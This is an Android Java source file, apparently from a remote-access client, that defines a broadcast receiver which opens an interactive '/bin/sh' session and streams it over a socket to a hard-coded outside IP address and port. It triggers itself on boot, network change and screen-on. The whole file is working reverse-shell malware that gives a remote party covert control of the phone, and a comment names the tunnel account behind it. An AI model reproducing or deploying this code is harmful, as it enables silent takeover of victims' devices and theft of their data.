package com.android.sus_client.receivers;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class NetcatConnectionReceiver extends BroadcastReceiver {

    // tunnel static ip from https://playit.gg (Account: mhacknull@gmail.com)

    /**
     * You got shell access of device using netcat server on any other machine (Remotely) over localhost with port 5050
     * netcat command -> nclp -p 5050
     */

    private final static int PORT = 57331;
    private final static String HOST = "147.185.221.16";
    private final static String TAG = "ConnectionReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Handle the broadcast here

        Log.e(TAG, "onReceive Called");
        new Thread(() -> {
            try {
                Log.e(TAG, "Thread Started");
                String[] cmd = {"/bin/sh", "-i"};
                Process proc = Runtime.getRuntime().exec(cmd);
                InputStream proc_in = proc.getInputStream();
                OutputStream proc_out = proc.getOutputStream();
                InputStream proc_err = proc.getErrorStream();

                Socket socket = new Socket(HOST, PORT);
                InputStream socket_in = socket.getInputStream();
                OutputStream socket_out = socket.getOutputStream();

                Log.e(TAG, "Thread Sending data...");
                while (true) {
                    while (proc_in.available() > 0) socket_out.write(proc_in.read());
                    while (proc_err.available() > 0) socket_out.write(proc_err.read());
                    while (socket_in.available() > 0) proc_out.write(socket_in.read());
                    socket_out.flush();
                    proc_out.flush();
                }
            } catch (IOException | StringIndexOutOfBoundsException e) {
                e.printStackTrace();
                Log.e(TAG, "Thread Exception: " + e.getMessage());
            }
        }).start();

    }

    /**
     * Helper methods
     */
    public static void startServer(Activity activity) {
        NetcatConnectionReceiver receiver = new NetcatConnectionReceiver();
        // dynamically register broadcast receiver
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        activity.registerReceiver(receiver, filter);
    }

}